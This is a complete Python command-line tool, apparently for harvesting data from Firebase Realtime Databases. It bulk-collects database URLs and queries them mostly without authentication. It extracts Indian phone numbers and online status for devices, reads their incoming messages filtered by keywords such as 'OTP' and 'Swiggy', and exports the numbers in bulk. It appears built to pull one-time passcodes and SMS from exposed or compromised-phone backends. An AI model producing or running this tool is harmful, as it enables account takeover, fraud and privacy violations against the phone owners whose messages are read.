#!/usr/bin/env python3
"""
Firebase RTDB Device & Number Explorer

A standalone CLI tool to:
1. Bulk-parse Firebase Realtime Database URLs from pasted text or lists.
2. Query each Firebase RTDB via REST API for devices and phone numbers.
3. Show aggregated counts: Total, Online, Offline, With Numbers, Online + Numbers.
4. Filter by status (Online, With Numbers, etc.) and search by keywords.
5. Inspect incoming messages / replies from devices, filtered by custom keywords.
6. Export filtered accounts/numbers to JSON or TXT.
"""

import sys
import re
import json
import time
from datetime import datetime
from pathlib import Path

try:
    import requests
except ImportError:
    print("Error: 'requests' library not found. Install it with: pip install requests")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt
    from rich import box
    console = Console()
    RICH_ENABLED = True
except ImportError:
    console = None
    RICH_ENABLED = False


# ── REGEX PATTERNS ────────────────────────────────────────────────────────────
FB_URL_RE = re.compile(
    r'https?://[a-zA-Z0-9_\-]+(?:\.firebaseio\.com|\.[a-zA-Z0-9_\-]+\.firebasedatabase\.app)',
    re.IGNORECASE
)
PHONE_RE = re.compile(r'(?:(?:\+|0{0,2})91[\s.-]?)?([6-9]\d{9})\b')


# ── HELPER FUNCTIONS ──────────────────────────────────────────────────────────
def print_panel(title, content, style="cyan"):
    if RICH_ENABLED:
        console.print(Panel(content, title=f"[bold {style}]{title}[/bold {style}]", border_style=style, padding=(1, 2)))
    else:
        print("\n" + "=" * 60)
        print(f" {title.upper()} ")
        print("=" * 60)
        print(content)
        print("=" * 60 + "\n")


def clean_url(url: str) -> str:
    url = url.strip().rstrip('/')
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url


def parse_firebase_urls(text: str) -> list[str]:
    """Extract all Firebase RTDB URLs from arbitrary text or list."""
    matches = FB_URL_RE.findall(text)
    clean_set = []
    seen = set()
    for m in matches:
        u = clean_url(m)
        if u not in seen:
            seen.add(u)
            clean_set.append(u)
    return clean_set


def is_device_online(info: dict) -> bool:
    """Determine online status based on boolean flag or timestamp activity."""
    if not isinstance(info, dict):
        return False
    
    # 1. Direct boolean / string flag
    for k in ('online', 'isOnline', 'is_online', 'connected', 'status'):
        if k in info:
            val = info[k]
            if isinstance(val, bool):
                return val
            if isinstance(val, str):
                v_lower = val.lower().strip()
                if v_lower in ('online', 'active', 'connected', 'true', '1'):
                    return True
                if v_lower in ('offline', 'inactive', 'disconnected', 'false', '0'):
                    return False
    
    # 2. Timestamp check (within last 15 minutes)
    for k in ('timestamp', 'lastSeen', 'last_seen', 'updatedAt', 'time'):
        ts = info.get(k)
        if isinstance(ts, (int, float)):
            # Handle seconds vs milliseconds
            if ts < 10000000000:
                ts *= 1000
            now_ms = time.time() * 1000
            diff_min = (now_ms - ts) / (1000 * 60)
            if 0 <= diff_min <= 15:
                return True
    
    return False


def extract_phone(info: dict, key: str = '') -> str:
    """Extract and normalize a 10-digit Indian phone number from device info."""
    clean = ''
    if isinstance(info, dict):
        for k in ('phone', 'mobile', 'phoneNumber', 'mobileNumber', 'number', 'phone_number'):
            v = info.get(k)
            if v:
                m = PHONE_RE.search(str(v))
                if m:
                    clean = m.group(1)
                    break
    
    if not clean and key:
        m = PHONE_RE.search(str(key))
        if m:
            clean = m.group(1)
            
    return clean


# ── FIREBASE FETCHER ──────────────────────────────────────────────────────────
class FirebaseDeviceManager:
    def __init__(self):
        self.databases: list[dict] = []  # { url, name, token, path, infoPath }
        self.devices: list[dict] = []    # all normalized device items
        self.fetch_errors: list[str] = []

    def add_database(self, url: str, name: str = "", path: str = "messages", info_path: str = "clients", token: str = ""):
        clean_u = clean_url(url)
        if any(d['url'] == clean_u for d in self.databases):
            return False
        if not name:
            name = clean_u.replace('https://', '').replace('.firebaseio.com', '').replace('.firebasedatabase.app', '')
        self.databases.append({
            'url': clean_u,
            'name': name,
            'path': path or 'messages',
            'infoPath': info_path or 'clients',
            'token': token.strip()
        })
        return True

    def fetch_all(self):
        """Fetch devices from all configured databases."""
        self.devices = []
        self.fetch_errors = []
        
        for db in self.databases:
            base_url = db['url']
            auth_param = f"?auth={db['token']}" if db['token'] else ""
            
            # 1. Fetch device info (default: /clients.json)
            info_map = {}
            if db['infoPath']:
                endpoint = f"{base_url}/{db['infoPath']}.json{auth_param}"
                try:
                    r = requests.get(endpoint, timeout=12)
                    if r.status_code == 200:
                        data = r.json()
                        if isinstance(data, dict):
                            info_map = data
                except Exception as e:
                    self.fetch_errors.append(f"[{db['name']}] Error fetching info: {e}")

            # 2. Fetch keys / messages (default: /messages.json?shallow=true)
            keys_set = set(info_map.keys())
            if db['path']:
                endpoint = f"{base_url}/{db['path']}.json?shallow=true"
                if db['token']:
                    endpoint += f"&auth={db['token']}"
                try:
                    r = requests.get(endpoint, timeout=12)
                    if r.status_code == 200:
                        data = r.json()
                        if isinstance(data, dict):
                            keys_set.update(data.keys())
                except Exception as e:
                    self.fetch_errors.append(f"[{db['name']}] Error fetching keys: {e}")

            # 3. Normalize into device list
            for key in sorted(keys_set):
                if not isinstance(key, str) or len(key) < 4:
                    continue
                info = info_map.get(key) or {}
                phone = extract_phone(info, key)
                online = is_device_online(info)
                model = info.get('model') or info.get('device') or info.get('brand') or '—'
                
                self.devices.append({
                    'db_name': db['name'],
                    'db_url': base_url,
                    'db_path': db['path'],
                    'key': key,
                    'phone': phone,
                    'phone_fmt': f"+91 {phone[:5]} {phone[5:]}" if phone else "—",
                    'has_phone': bool(phone),
                    'online': online,
                    'model': str(model),
                    'info': info
                })

    def get_messages(self, device: dict, keyword: str = "") -> list[dict]:
        """Fetch incoming messages for a device and filter by keyword."""
        base_url = device['db_url']
        path = device['db_path']
        key = device['key']
        endpoint = f"{base_url}/{path}/{key}.json?orderBy=\"$key\"&limitToLast=30"
        
        try:
            r = requests.get(endpoint, timeout=12)
            if r.status_code != 200:
                return []
            data = r.json()
            if not isinstance(data, dict):
                return []
            
            items = []
            kw = keyword.strip().lower()
            for msg_id, msg in data.items():
                if not isinstance(msg, dict):
                    continue
                text = str(msg.get('message') or msg.get('body') or msg.get('text') or '')
                sender = str(msg.get('sender') or msg.get('from') or '')
                date_time = str(msg.get('dateTime') or msg.get('timestamp') or '')
                
                if kw and (kw not in text.lower() and kw not in sender.lower()):
                    continue
                
                items.append({
                    'id': msg_id,
                    'sender': sender or '—',
                    'message': text,
                    'dateTime': date_time
                })
            return items
        except Exception as e:
            return [{'id': 'err', 'sender': 'Error', 'message': str(e), 'dateTime': ''}]


# ── CLI APPLICATION INTERFACE ─────────────────────────────────────────────────
def display_summary(manager: FirebaseDeviceManager):
    total = len(manager.devices)
    online = sum(1 for d in manager.devices if d['online'])
    offline = total - online
    with_num = sum(1 for d in manager.devices if d['has_phone'])
    online_num = sum(1 for d in manager.devices if d['online'] and d['has_phone'])
    offline_num = sum(1 for d in manager.devices if not d['online'] and d['has_phone'])

    if RICH_ENABLED:
        tbl = Table(title="📊 Firebase Devices & Numbers Summary", box=box.ROUNDED)
        tbl.add_column("Category Metric", style="cyan")
        tbl.add_column("Count", justify="right", style="bold white")
        tbl.add_column("Description", style="dim")

        tbl.add_row("Connected Databases", str(len(manager.databases)), "Active RTDB instances")
        tbl.add_row("Total Devices", str(total), "All unique device keys found")
        tbl.add_row("🟢 Online Devices", str(online), "Currently connected / active")
        tbl.add_row("⚪ Offline Devices", str(offline), "Inactive devices")
        tbl.add_row("📱 With Numbers", str(with_num), "Extracted 10-digit mobile numbers")
        tbl.add_row("🟢📱 Online + Numbers", f"[bold green]{online_num}[/bold green]", "Active devices ready with phone number")
        tbl.add_row("⚪📱 Offline + Numbers", str(offline_num), "Inactive devices with known numbers")
        console.print(tbl)
    else:
        print("\n" + "=" * 50)
        print(" FIREBASE DEVICES & NUMBERS SUMMARY")
        print("=" * 50)
        print(f" Connected Databases : {len(manager.databases)}")
        print(f" Total Devices       : {total}")
        print(f" 🟢 Online           : {online}")
        print(f" ⚪ Offline          : {offline}")
        print(f" 📱 With Numbers     : {with_num}")
        print(f" 🟢📱 Online + Nums  : {online_num}")
        print(f" ⚪📱 Offline + Nums : {offline_num}")
        print("=" * 50 + "\n")


def display_device_table(devices: list[dict], max_rows: int = 50):
    if not devices:
        print("\n[!] No devices match the current filter.\n")
        return

    to_show = devices[:max_rows]
    if RICH_ENABLED:
        tbl = Table(title=f"Filtered Devices List (Showing {len(to_show)} of {len(devices)})", box=box.SIMPLE_HEAVY)
        tbl.add_column("#", style="dim", width=4)
        tbl.add_column("Status", width=10)
        tbl.add_column("Phone Number", style="bold cyan")
        tbl.add_column("Device ID / Key", style="purple")
        tbl.add_column("Database", style="yellow")
        tbl.add_column("Model / Info", style="white")

        for i, d in enumerate(to_show, 1):
            status = "[green]🟢 Online[/green]" if d['online'] else "[dim]⚪ Offline[/dim]"
            phone_str = d['phone_fmt'] if d['has_phone'] else "[dim]—[/dim]"
            tbl.add_row(str(i), status, phone_str, d['key'], d['db_name'], d['model'])
        console.print(tbl)
    else:
        print("\n" + "-" * 75)
        print(f"{'#':<4} {'Status':<10} {'Phone Number':<18} {'Device ID':<22} {'Database':<15}")
        print("-" * 75)
        for i, d in enumerate(to_show, 1):
            st = "ONLINE" if d['online'] else "OFFLINE"
            ph = d['phone_fmt'] if d['has_phone'] else "—"
            print(f"{i:<4} {st:<10} {ph:<18} {d['key'][:20]:<22} {d['db_name'][:14]:<15}")
        print("-" * 75 + "\n")


def inspect_replies_flow(manager: FirebaseDeviceManager):
    """Pick a device or phone number and stream/search incoming messages."""
    query = input("\nEnter Device Key, Phone Number, or Index to inspect replies (or 'b' to back): ").strip()
    if query.lower() in ('b', 'back', ''):
        return

    # Match target device
    target = None
    if query.isdigit() and 1 <= int(query) <= len(manager.devices):
        target = manager.devices[int(query) - 1]
    else:
        for d in manager.devices:
            if query == d['phone'] or query == d['key'] or query in d['key']:
                target = d
                break

    if not target:
        print("[!] No matching device found.")
        return

    keyword = input("Filter replies by keyword (e.g., OTP, Swiggy, code, or press ENTER for all): ").strip()
    print(f"\n[+] Fetching replies for device '{target['key']}' ({target['phone_fmt']})...")
    messages = manager.get_messages(target, keyword)

    if not messages:
        print("[!] No messages found matching the filter.")
        return

    if RICH_ENABLED:
        tbl = Table(title=f"📨 Replies for {target['phone_fmt']} ({target['key']}) - Keyword: '{keyword or 'ALL'}'", box=box.ROUNDED)
        tbl.add_column("Msg ID", style="dim", width=14)
        tbl.add_column("Sender / From", style="bold yellow", width=18)
        tbl.add_column("Date / Time", style="cyan", width=20)
        tbl.add_column("Message Text", style="white")

        for m in messages:
            tbl.add_row(m['id'], m['sender'], m['dateTime'], m['message'])
        console.print(tbl)
    else:
        print("\n" + "=" * 60)
        for m in messages:
            print(f"[{m['dateTime']}] From: {m['sender']}")
            print(f"Message: {m['message']}")
            print("-" * 40)
        print("=" * 60 + "\n")


def export_flow(devices: list[dict]):
    """Export filtered devices to JSON or TXT."""
    if not devices:
        print("[!] No devices to export.")
        return

    print("\nExport Formats:")
    print(" 1. JSON Array (accounts_array.json)")
    print(" 2. Phone Numbers Text File (phones.txt)")
    print(" 3. CSV File (devices.csv)")
    print(" b. Back")

    choice = input("Select format: ").strip().lower()
    if choice == '1':
        fname = "accounts_array.json"
        out_data = [{
            "phone": d['phone'] or None,
            "displayPhone": d['phone_fmt'] if d['has_phone'] else None,
            "deviceId": d['key'],
            "database": d['db_name'],
            "status": "online" if d['online'] else "offline",
            "model": d['model']
        } for d in devices]
        Path(fname).write_text(json.dumps(out_data, indent=2), encoding="utf-8")
        print(f"[✓] Saved {len(out_data)} records to '{fname}'")
    elif choice == '2':
        fname = "phones.txt"
        phones = [d['phone'] for d in devices if d['has_phone']]
        Path(fname).write_text("\n".join(phones), encoding="utf-8")
        print(f"[✓] Saved {len(phones)} phone numbers to '{fname}'")
    elif choice == '3':
        fname = "devices.csv"
        lines = ["DeviceID,Phone,Status,Database,Model"]
        for d in devices:
            st = "online" if d['online'] else "offline"
            lines.append(f"\"{d['key']}\",\"{d['phone']}\",\"{st}\",\"{d['db_name']}\",\"{d['model']}\"")
        Path(fname).write_text("\n".join(lines), encoding="utf-8")
        print(f"[✓] Saved {len(devices)} rows to '{fname}'")


# ── MAIN LOOP ─────────────────────────────────────────────────────────────────
def main():
    if len(sys.argv) > 1 and sys.argv[1] in ('-h', '--help', 'help'):
        print("""
Firebase RTDB Device & Number Explorer (Standalone Terminal CLI)

Usage:
  python3 firebase_explorer.py
  python3 firebase_explorer.py <firebase_url> [<firebase_url2> ...]
  python3 firebase_explorer.py --file urls.txt

Features:
  • Bulk Firebase parsing from text, URLs, or files
  • Counts: Total Devices, Online, Offline, With Numbers, Online + Numbers
  • Interactive filters (🟢📱 Online + Numbers, 📱 With Numbers, etc.)
  • Live reply/message inspection filtered by keywords (OTP, code, custom)
  • Fast search across device keys, phone numbers, and phone models
  • Export to clean JSON arrays, plain text phone lists, or CSV
""")
        return

    manager = FirebaseDeviceManager()
    
    print_panel(
        "Firebase RTDB Device & Number Explorer",
        "Extract, filter, and inspect devices, phone numbers, and incoming message replies\n"
        "across all your Firebase Realtime Databases.",
        style="cyan"
    )

    # Step 1: Collect Firebase URLs from argv or prompt
    extracted_urls = []
    
    # Check CLI arguments
    if len(sys.argv) > 1:
        args_text = []
        i = 1
        while i < len(sys.argv):
            arg = sys.argv[i]
            if arg in ('-f', '--file') and i + 1 < len(sys.argv):
                fpath = Path(sys.argv[i + 1])
                if fpath.exists():
                    args_text.append(fpath.read_text(encoding='utf-8', errors='ignore'))
                else:
                    print(f"[!] File not found: {fpath}")
                i += 2
                continue
            elif Path(arg).is_file():
                args_text.append(Path(arg).read_text(encoding='utf-8', errors='ignore'))
            else:
                args_text.append(arg)
            i += 1
        extracted_urls = parse_firebase_urls("\n".join(args_text))
        if extracted_urls:
            print(f"[+] Loaded {len(extracted_urls)} Firebase URL(s) from command line arguments.")

    if not extracted_urls:
        print("Paste your Firebase Realtime Database URLs or enter a file path below.")
        print("You can paste single URLs, multiple comma/space separated URLs, or a raw text dump.")
        print("Press ENTER twice when finished pasting:")

        lines = []
        while True:
            try:
                line = input()
                if not line.strip() and lines and not lines[-1].strip():
                    break
                lines.append(line)
            except EOFError:
                break

        raw_text = "\n".join(lines).strip()
        # Check if the user entered a single file path
        if raw_text and Path(raw_text).is_file():
            raw_text = Path(raw_text).read_text(encoding='utf-8', errors='ignore')

        extracted_urls = parse_firebase_urls(raw_text)

    if not extracted_urls:
        print("[!] No valid Firebase URLs detected in the input.")
        manual = input("\nEnter a Firebase URL manually (or 'q' to quit): ").strip()
        if manual.lower() == 'q' or not manual:
            print("Exiting.")
            return
        extracted_urls = parse_firebase_urls(manual)
        if not extracted_urls:
            extracted_urls = [clean_url(manual)]

    print(f"\n[+] Detected {len(extracted_urls)} Firebase database(s):")
    for i, u in enumerate(extracted_urls, 1):
        print(f" {i}. {u}")
        manager.add_database(u)

    # Step 2: Fetch and build dataset
    print("\n[+] Querying Firebase Realtime Databases (REST API)...")
    manager.fetch_all()

    if manager.fetch_errors:
        print("\n[!] Warnings / Connection Notices:")
        for err in manager.fetch_errors:
            print(f"  • {err}")

    # Step 3: Interactive Filter Menu
    current_filter = "online_with_numbers"
    
    while True:
        display_summary(manager)

        # Apply active filter
        if current_filter == "all":
            filtered = manager.devices
            filter_label = "All Devices"
        elif current_filter == "online":
            filtered = [d for d in manager.devices if d['online']]
            filter_label = "🟢 Online Devices"
        elif current_filter == "offline":
            filtered = [d for d in manager.devices if not d['online']]
            filter_label = "⚪ Offline Devices"
        elif current_filter == "with_numbers":
            filtered = [d for d in manager.devices if d['has_phone']]
            filter_label = "📱 Devices With Numbers"
        elif current_filter == "online_with_numbers":
            filtered = [d for d in manager.devices if d['online'] and d['has_phone']]
            filter_label = "🟢📱 Online + With Numbers"
        elif current_filter == "offline_with_numbers":
            filtered = [d for d in manager.devices if not d['online'] and d['has_phone']]
            filter_label = "⚪📱 Offline + With Numbers"
        else:
            filtered = manager.devices
            filter_label = "Custom"

        print(f"Active Filter: [ {filter_label} ] (Matching: {len(filtered)})")
        display_device_table(filtered, max_rows=30)

        print("\nAction Options:")
        print(" 1. Filter: 🟢📱 Online + Numbers")
        print(" 2. Filter: 📱 With Numbers")
        print(" 3. Filter: 🟢 Online Only")
        print(" 4. Filter: ⚪ Offline Only")
        print(" 5. Filter: ⚪📱 Offline + Numbers")
        print(" 6. Filter: Show All Devices")
        print(" 7. 📨 Inspect Incoming Device Replies / Messages (Search by Keyword)")
        print(" 8. 🔍 Search devices by Phone / Model / Key")
        print(" 9. 🔄 Refresh / Re-query Databases")
        print(" 10. ➕ Add more Firebase URLs")
        print(" 11. 💾 Export filtered devices to JSON / TXT / CSV")
        print(" q. Quit")

        choice = input("\nSelect option [1-11, q]: ").strip().lower()

        if choice == '1':
            current_filter = "online_with_numbers"
        elif choice == '2':
            current_filter = "with_numbers"
        elif choice == '3':
            current_filter = "online"
        elif choice == '4':
            current_filter = "offline"
        elif choice == '5':
            current_filter = "offline_with_numbers"
        elif choice == '6':
            current_filter = "all"
        elif choice == '7':
            inspect_replies_flow(manager)
        elif choice == '8':
            kw = input("Enter search term (phone number, device key, or model): ").strip().lower()
            if kw:
                results = [d for d in manager.devices if kw in d['key'].lower() or kw in d['phone'] or kw in d['model'].lower()]
                print(f"\n[+] Found {len(results)} matching devices:")
                display_device_table(results, max_rows=50)
                input("\nPress ENTER to return to menu...")
        elif choice == '9':
            print("\n[+] Re-querying all databases...")
            manager.fetch_all()
        elif choice == '10':
            new_url = input("Enter Firebase URL to add: ").strip()
            if new_url:
                for u in parse_firebase_urls(new_url):
                    manager.add_database(u)
                print("[+] Re-fetching with new databases...")
                manager.fetch_all()
        elif choice == '11':
            export_flow(filtered)
        elif choice in ('q', 'quit', 'exit'):
            print("Goodbye.")
            break


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProcess interrupted by user. Exiting.")
